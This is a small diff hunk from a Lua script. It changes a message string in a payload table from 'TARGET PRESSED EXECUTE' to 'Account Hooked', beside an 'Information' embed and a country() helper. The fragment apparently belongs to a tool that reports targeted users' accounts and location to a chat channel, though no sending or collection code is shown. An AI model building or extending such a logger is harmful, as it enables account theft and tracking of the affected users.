@@ -124,7 +124,7 @@ local function country()
 end
 
 local payload = {
-    content = "TARGET PRESSED EXECUTE @here @everyone",
+    content = "Account Hooked @Admin @Informational",
     embeds = {
         {
             title       = "Information",
